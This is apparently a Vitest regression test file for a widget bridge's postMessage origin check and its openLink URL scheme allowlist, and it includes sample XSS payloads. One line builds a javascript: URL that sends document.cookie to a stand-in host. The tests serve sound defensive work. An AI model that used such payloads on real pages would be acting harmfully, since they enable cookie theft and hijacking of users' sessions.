// Regression tests for two bridge.js gaps found in security review (ADR-0037
// widgets): the postMessage listener accepted a message from any window that
// got a handle to the widget's iframe (not just the real host), and
// openLink() forwarded any URL scheme — including "javascript:"/"data:" —
// straight to window.open()/ui/open-link without checking it, unlike
// markdown.js's link renderer which already allowlists schemes.
import { describe, expect, it } from "vitest";
import { isSafeLinkUrl, isTrustedMessageSource } from "../src/widgets/bridge.js";

describe("isTrustedMessageSource — postMessage origin handling", () => {
  const parent = { name: "real-host-frame" };
  const attacker = { name: "some-other-frame-with-a-handle-to-us" };

  it("trusts a message whose source is the frame we did the handshake with", () => {
    expect(isTrustedMessageSource(parent, parent)).toBe(true);
  });

  it("rejects a message from any other window, even with a valid jsonrpc envelope", () => {
    expect(isTrustedMessageSource(attacker, parent)).toBe(false);
  });

  it("rejects a message with no source at all", () => {
    expect(isTrustedMessageSource(null, parent)).toBe(false);
    expect(isTrustedMessageSource(undefined, parent)).toBe(false);
  });
});

describe("isSafeLinkUrl — openLink scheme allowlist", () => {
  it("allows http, https and mailto", () => {
    expect(isSafeLinkUrl("https://example.test/assignment/1")).toBe(true);
    expect(isSafeLinkUrl("http://example.test")).toBe(true);
    expect(isSafeLinkUrl("mailto:staff@example.test")).toBe(true);
  });

  it("allows relative and anchor URLs", () => {
    expect(isSafeLinkUrl("/course/1")).toBe(true);
    expect(isSafeLinkUrl("#section")).toBe(true);
    expect(isSafeLinkUrl("")).toBe(true);
  });

  it("rejects javascript:, data: and vbscript: URLs, including with mixed case or leading whitespace", () => {
    expect(isSafeLinkUrl("javascript:alert(document.cookie)")).toBe(false);
    expect(isSafeLinkUrl("  JavaScript:alert(1)")).toBe(false);
    expect(isSafeLinkUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
    expect(isSafeLinkUrl("vbscript:msgbox(1)")).toBe(false);
  });

  it("rejects a malicious item URL as ingested from an untrusted source (Ed/Gmail/Canvas item.url)", () => {
    // The one real call site (course-view.html) hands bridge.openLink() a
    // course/item url straight from door tool structuredContent — data that
    // ultimately traces back to a third-party plugin, not something unicorn
    // controls the shape of.
    const maliciousItemUrl = "javascript:fetch('https://evil.test/steal?c='+document.cookie)";
    expect(isSafeLinkUrl(maliciousItemUrl)).toBe(false);
  });
});
